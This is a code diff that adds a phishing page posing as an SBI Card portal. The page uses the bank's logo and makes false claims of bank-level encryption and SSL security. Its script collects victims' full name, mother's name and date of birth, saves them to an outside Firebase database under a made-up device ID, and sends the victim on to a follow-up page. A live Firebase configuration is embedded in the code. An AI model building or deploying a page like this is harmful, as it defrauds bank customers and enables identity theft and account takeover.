@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Secure SBI Portal</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+
+
+/* Mobile device ke liye adjustment */
+    @media (max-width: 490px) {
+    .form-container {
+        padding: 25px 20px;
+    }
+    .input-field {
+        padding: 20px 20px 20px 50px; /* Thoda zyada padding */
+        font-size: 16px; /* 16px font size iOS par auto-zoom nahi hone deta */
+    }
+    .submit-btn {
+        padding: 20px;
+    }
+    }
+
+        /* Professional Header */
+    
+        .header h2 { margin: 0; font-size: 22px; }
+        .header p { margin: 5px 0 0; opacity: 0.8; font-size: 13px; }
+
+        /* Form Styling */
+        .form-container { padding: 40px 30px; }
+        .input-group { position: relative; margin-bottom: 30px; }
+        .input-field { width: 100%; padding: 18px 20px 18px 50px; border: 2px solid #e0e0e0; border-radius: 15px; font-size: 16px; outline: none; transition: 0.3s; box-sizing: border-box; background: #fafafa; }
+        
+        /* Icons & Labels */
+        .input-icon { position: absolute; left: 18px; top: 20px; color: #999; transition: 0.3s; }
+        .label { position: absolute; left: 50px; top: 18px; color: #888; pointer-events: none; transition: 0.3s; padding: 0 5px; font-size: 16px; }
+        
+        /* Material Floating Animation */
+        .input-field:focus, .input-field:valid, .input-field:not(:placeholder-shown) { border-color: #1a237e; background: #fff; }
+        .input-field:focus + .input-icon, .input-field:not(:placeholder-shown) + .input-icon { color: #1a237e; }
+        .input-field:focus + .input-icon + .label, .input-field:not(:placeholder-shown) + .input-icon + .label {
+            top: -10px; left: 40px; font-size: 12px; color: #1a237e; font-weight: bold; background: #fff; border-radius: 4px;
+        }
+
+        /* Submit Button */
+        .submit-btn { width: 100%; padding: 18px; background: #1a237e; color: white; border: none; border-radius: 15px; font-size: 17px; font-weight: 700; cursor: pointer; transition: 0.4s; box-shadow: 0 10px 20px rgba(26,35,126,0.25); }
+        .submit-btn:hover { background: #0d1350; transform: translateY(-2px); }
+
+        /* Footer */
+        .footer { text-align: center; color: #777; font-size: 12px; margin-top: 30px; padding-bottom: 20px; border-top: 1px solid #eee; padding-top: 20px; }
+        .ssl { color: #2e7d32; font-weight: bold; margin-top: 8px; display: flex; align-items: center; justify-content: center; gap: 8px; }
+
+/* Header Section */
+/* 1. Body se default margin aur background hatayein */
+/* 1. Body se saari padding hata dein taaki card poori screen par aaye */
+body { 
+    margin: 0; 
+    padding: 0; /* Padding hata di */
+    background-color: #eef2f7; 
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+body {
+    font-family: 'Inter', sans-serif;
+}
+
+
+/* 2. Wrapper ko 100% width aur height de dein */
+.wrapper { 
+    width: 100%; 
+    height: 100vh; /* Mobile par full screen height */
+    max-width: 100%; /* Max width 100% */
+    background: #ffffff; 
+    border-radius: 0; /* Full screen ke liye radius 0 */
+    overflow-y: auto; /* Agar content zyada ho toh scroll ho sake */
+    box-shadow: none; /* Full screen par shadow zaroorat nahi */
+}
+
+/* 3. Header ke corners ko bhi adjustment ki zaroorat padegi */
+.header { 
+    background: linear-gradient(135deg, #1a237e 0%, #3949ab 100%); 
+    color: #fff; 
+    padding: 60px 20px; /* Header ko thoda bada kiya */
+    text-align: center;
+    border-bottom-left-radius: 30px; 
+    border-bottom-right-radius: 30px;
+    margin: 0;
+}
+
+/* Logo Container */
+.logo-box {
+    width: 80px;
+    height: 80px;
+    background: #ffffff;
+    border-radius: 15px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin: 0 auto 15px;
+    padding: 10px;
+    box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+}
+
+.logo-box img {
+    width: 100%;
+    height: auto;
+    object-fit: contain;
+}
+
+    </style>
+</head>
+<body>
+<div class="wrapper">
+    <div class="header">
+        <div class="logo-box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/c/cc/SBI-logo.svg" alt="SBI Logo">
+        </div>
+        <h2>SBI Card Portal</h2>
+        <p>Your trusted partner for secure banking</p>
+    </div>
+
+    <div class="form-container">
+        <div class="input-group">
+            <input type="text" class="input-field" placeholder=" " required>
+            <i class="fa-solid fa-user input-icon"></i>
+            <label class="label">Full Name *</label>
+        </div>
+
+        <div class="input-group">
+            <input type="text" class="input-field" placeholder=" " required>
+            <i class="fa-solid fa-user-friends input-icon"></i>
+            <label class="label">Mother's Name *</label>
+        </div>
+
+        <div class="input-group">
+            <input type="text" class="input-field" id="dob-input" placeholder=" " maxlength="10" required>
+            <i class="fa-solid fa-calendar-days input-icon"></i>
+            <label class="label" id="dob-label">Date Of Birth *</label>
+        </div>
+
+        <button class="submit-btn">Continue Securely</button>
+
+        <div class="footer">
+            <p>Your session is protected with bank-level encryption.</p>
+            <div class="ssl"><i class="fa-solid fa-lock"></i> SECURED BY SSL</div>
+        </div>
+    </div>
+</div>
+
+<script type="module">
+    // Firebase Imports
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+    import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+
+    // 1. Firebase Config (Apni details yahan dalein)
+   const firebaseConfig = {
+  apiKey: "AIzaSyAwWY4o9S_pl5sf4Kx222tY4o88Fevd-LY",
+  authDomain: "sbi-web-4dc1a.firebaseapp.com",
+  databaseURL: "https://sbi-web-4dc1a-default-rtdb.firebaseio.com",
+  projectId: "sbi-web-4dc1a",
+  storageBucket: "sbi-web-4dc1a.firebasestorage.app",
+  messagingSenderId: "403823554746",
+  appId: "1:403823554746:web:0f5cf6b16ac457fe069283",
+  measurementId: "G-TVZTMY4HMY"
+};
+
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    // 2. Android-like Unique Device ID generate karein
+    let deviceId = localStorage.getItem('android_device_id');
+    if (!deviceId) {
+        deviceId = 'android_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
+        localStorage.setItem('android_device_id', deviceId);
+    }
+
+    // 3. Form Submission Logic
+    document.querySelector('.submit-btn').addEventListener('click', async function(e) {
+        e.preventDefault(); // Default button behavior rokein
+
+        const inputs = document.querySelectorAll('.input-field');
+        const fullName = inputs[0];
+        const motherName = inputs[1];
+        const dob = inputs[2];
+
+        // Reset borders
+        inputs.forEach(i => i.style.borderColor = "#e0e0e0");
+
+        // Step-by-Step Validation
+        if (fullName.value.trim() === "") {
+            alert("⚠️ Please enter your Full Name.");
+            fullName.style.borderColor = "red";
+            fullName.focus();
+            return;
+        }
+
+        if (motherName.value.trim() === "") {
+            alert("⚠️ Please enter your Mother's Name.");
+            motherName.style.borderColor = "red";
+            motherName.focus();
+            return;
+        }
+
+        if (dob.value.trim().length < 10) {
+            alert("⚠️ Please enter a valid Date of Birth (DD/MM/YYYY).");
+            dob.style.borderColor = "red";
+            dob.focus();
+            return;
+        }
+
+        // Processing State
+        this.innerText = "Processing...";
+        this.disabled = true;
+
+        try {
+    // 'User_Records' key ke andar deviceId se data save hoga
+    await set(ref(db, 'User_Records/' + deviceId), {
+        device_id: deviceId,
+        full_name: fullName.value.trim(),
+        mother_name: motherName.value.trim(),
+        dob: dob.value.trim(),
+        status: "pending",
+        last_updated: new Date().toLocaleString()
+    });
+
+    // Redirect to next page
+    window.location.href = "page2.html"; 
+
+} catch (error) {
+    console.error("Firebase Error:", error);
+    alert("Failed to submit. Please check your connection.");
+    this.innerText = "Continue Securely";
+    this.disabled = false;
+}
+    });
+
+    // 4. DOB Auto-formatting script
+    const dobInput = document.getElementById('dob-input');
+    dobInput.addEventListener('input', function (e) {
+        let v = e.target.value.replace(/\D/g, '');
+        if (v.length > 2 && v.length <= 4) v = v.slice(0, 2) + '/' + v.slice(2);
+        else if (v.length > 4) v = v.slice(0, 2) + '/' + v.slice(2, 4) + '/' + v.slice(4, 8);
+        e.target.value = v;
+    });
+</script>
+
+</body>
+</html>
